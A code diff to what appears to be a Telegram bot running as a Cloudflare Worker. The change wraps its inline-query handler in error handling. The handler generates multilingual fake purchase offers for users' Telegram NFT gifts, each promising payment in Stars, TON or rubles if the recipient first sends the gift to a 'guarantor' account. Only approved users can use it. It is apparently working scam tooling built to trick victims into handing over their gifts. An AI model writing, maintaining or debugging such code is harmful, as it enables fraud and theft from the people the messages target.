@@ -52,90 +52,96 @@ export default {
 
       // --- INLINE-ЗАПРОСЫ ---
       if (update.inline_query) {
-        const iq = update.inline_query;
-        const userId = iq.from.id;
-        const username = iq.from.username || "";
+        try {
+            const iq = update.inline_query;
+            const userId = iq.from.id;
+            const username = iq.from.username || "";
 
-        if (kv) await kv.put(`user:${userId}`, username || "no_username");
+            if (kv) await kv.put(`user:${userId}`, username || "no_username");
 
-        const hasAccess = await checkAccess(userId, username);
-        if (!hasAccess) return new Response("OK", { status: 200 });
+            const hasAccess = await checkAccess(userId, username);
+            if (!hasAccess) return new Response("OK", { status: 200 });
 
-        let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
-        
-        let lang = "ru";
-        if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
-        else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }
+            let textQuery = iq.query.replace(/[\u00A0\u200B\u202F]/g, ' ').replace(/https?:\/\//gi, '').trim().toLowerCase(); 
+            
+            let lang = "ru";
+            if (textQuery.includes("eng") || textQuery.includes("en ")) { lang = "en"; textQuery = textQuery.replace(/eng/g, '').trim(); } 
+            else if (textQuery.includes("cn") || textQuery.includes("中文")) { lang = "cn"; textQuery = textQuery.replace(/cn/g, '').trim(); }
 
-        const allNums = textQuery.match(/\d+/g); 
-        const amount = allNums ? allNums[allNums.length - 1] : "0"; 
-        
-        const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
-        let giftLink = "";
-        let giftDisplay = "";
-        if (giftMatch && giftMatch[0]) {
-            let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
-            giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
-            giftDisplay = rawGift;
-        } else {
-            giftLink = "https://t.me/telegram"; 
-            giftDisplay = "Ваш подарок";
+            const allNums = textQuery.match(/\d+/g); 
+            const amount = allNums ? allNums[allNums.length - 1] : "0"; 
+            
+            const giftMatch = textQuery.match(/(?:https?:\/\/)?(?:t\.me\/nft\/)?[A-Za-z0-9_-]+/i); 
+            let giftLink = "";
+            let giftDisplay = "";
+            if (giftMatch && giftMatch[0]) {
+                let rawGift = giftMatch[0].replace(/^https?:\/\//, '');
+                giftLink = rawGift.startsWith("t.me") ? "https://" + rawGift : "https://t.me/nft/" + rawGift;
+                giftDisplay = rawGift;
+            } else {
+                giftLink = "https://t.me/telegram"; 
+                giftDisplay = "Подарок";
+            }
+
+            let currencyType = "stars";
+            let currencySymbol = "⭐";
+            let currencyName = "Stars";
+
+            if (textQuery.includes("gram") || textQuery.includes("ton")) { 
+                currencyType = "gram"; 
+                currencySymbol = "💎"; 
+                currencyName = "Gram";
+            } else if (textQuery.includes("rub") || textQuery.includes("руб")) { 
+                currencyType = "rub"; 
+                currencySymbol = "₽"; 
+                currencyName = "Rub";
+            }
+
+            let senderName = iq.from.first_name || "";
+            if (iq.from.last_name) senderName += " " + iq.from.last_name;
+            if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
+            const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
+            
+            // ПОНЯТНЫЙ ТЕКСТ (ИСПРАВЛЕНА ОШИБКА С linkOrGift)
+            let text = "";
+            let btnAccept = "Принять";
+            let btnDecline = "Отклонить";
+            let titleText = "";
+
+            if (lang === "en") {
+                text = `📩 <b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nTo receive payment, send the gift to the guarantor @${RELAYER_USERNAME}.`;
+                btnAccept = "Accept";
+                btnDecline = "Decline";
+                titleText = `Offer: ${amount} ${currencyName}`;
+            } else if (lang === "cn") {
+                text = `📩 <b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n要获得付款，请将礼物发送给担保人 @${RELAYER_USERNAME}。`;
+                btnAccept = "接受";
+                btnDecline = "拒绝";
+                titleText = `报价: ${amount} ${currencyName}`;
+            } else {
+                text = `📩 <b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nЧтобы получить оплату, передайте подарок гаранту @${RELAYER_USERNAME}.`;
+                btnAccept = "Принять";
+                btnDecline = "Отклонить";
+                titleText = `Оффер: ${amount} ${currencyName}`;
+            }
+
+            const results = [{
+              type: "article", id: "1",
+              title: titleText,
+              description: `${amount} ${currencyName} за ${giftDisplay}`,
+              input_message_content: { message_text: text, parse_mode: "HTML" },
+              reply_markup: { inline_keyboard: [
+                  [{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
+                  [{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]
+              ] }
+            }];
+
+            await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
+        } catch (e) { 
+            console.error("Ошибка inline_query:", e.message); 
+            // Отправляем пустой ответ, чтобы Telegram не висел
+            await callApi("answerInlineQuery", { inline_query_id: update.inline_query.id, results: [], cache_time: 0 }, BOT_TOKEN);
         }
-
-        let currencyType = "stars";
-        let currencySymbol = "⭐";
-        let currencyName = "Stars";
-
-        if (textQuery.includes("gram") || textQuery.includes("ton")) { 
-            currencyType = "gram"; 
-            currencySymbol = "💎"; 
-            currencyName = "Gram";
-        } else if (textQuery.includes("rub") || textQuery.includes("руб")) { 
-            currencyType = "rub"; 
-            currencySymbol = "₽"; 
-            currencyName = "Rub";
-        }
-
-        let senderName = iq.from.first_name || "";
-        if (iq.from.last_name) senderName += " " + iq.from.last_name;
-        if (!senderName) senderName = iq.from.username ? "@" + iq.from.username : "Игрок";
-        const sellerUsername = iq.from.username ? iq.from.username.toLowerCase() : "gwrex";
-        
-        // ПОНЯТНЫЙ ТЕКСТ
-        let text = "";
-        let btnAccept = "Принять";
-        let btnDecline = "Отклонить";
-        let titleText = "";
-
-        if (lang === "en") {
-            text = `📩 <b>Offer for your gift</b>\n\nYou are offered <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nTo receive payment, send the gift to the guarantor @${RELAYER_USERNAME}.`;
-            btnAccept = "Accept";
-            btnDecline = "Decline";
-            titleText = `Offer: ${amount} ${currencyName}`;
-        } else if (lang === "cn") {
-            text = `📩 <b>针对您礼物的报价</b>\n\n有人为您提供 <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\n要获得付款，请将礼物发送给担保人 @${RELAYER_USERNAME}。`;
-            btnAccept = "接受";
-            btnDecline = "拒绝";
-            titleText = `报价: ${amount} ${currencyName}`;
-        } else {
-            text = `📩 <b>Оффер на ваш подарок</b>\n\nВам предлагают <b>${amount} ${currencyName}</b> ${currencySymbol}\n🎁 ${giftDisplay}\n\nЧтобы получить оплату, передайте подарок гаранту @${RELAYER_USERNAME}.`;
-            btnAccept = "Принять";
-            btnDecline = "Отклонить";
-            titleText = `Оффер: ${amount} ${currencyName}`;
-        }
-
-        const results = [{
-          type: "article", id: "1",
-          title: titleText,
-          description: `${amount} ${currencyName} за ${giftDisplay}`,
-          input_message_content: { message_text: text, parse_mode: "HTML" },
-          reply_markup: { inline_keyboard: [
-              [{ text: btnAccept, callback_data: `acc|${amount}|${currencyType}|${sellerUsername}|${giftLink}|${lang}` }],
-              [{ text: btnDecline, callback_data: `dec|${amount}|${currencyType}|${lang}` }]
-          ] }
-        }];
-
-        await callApi("answerInlineQuery", { inline_query_id: iq.id, results: results, cache_time: 0 }, BOT_TOKEN);
       }
 
       // --- КНОПКИ ---
@@ -143,7 +149,7 @@ export default {
         const cq = update.callback_query;
         const chatId = cq.message.chat.id;
         
-        // МГНОВЕННЫЙ ОТВЕТ (чтобы кнопки не висели)
+        // МГНОВЕННЫЙ ОТВЕТ
         try {
             if (cq.data.startsWith("acc")) {
                 await callApi("answerCallbackQuery", { callback_query_id: cq.id, text: "Оффер принят ✅", show_alert: true }, BOT_TOKEN);
